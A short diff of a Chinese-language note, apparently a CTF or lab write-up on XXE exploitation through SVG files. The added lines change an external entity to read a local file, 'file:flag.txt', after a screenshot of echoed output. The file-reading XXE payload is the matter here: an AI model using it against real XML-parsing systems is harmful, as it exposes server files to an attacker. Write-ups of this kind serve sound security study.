@@ -49,3 +49,6 @@ DOCTYPE内部定义DTD命名实体`xxe`
 回显：
 
 ![](assets/SVG进行XXE漏洞利用/file-20260110224129161.png)
+
+更改定义
+`<!ENTITY xxe SYSTEM "file:flag.txt">`
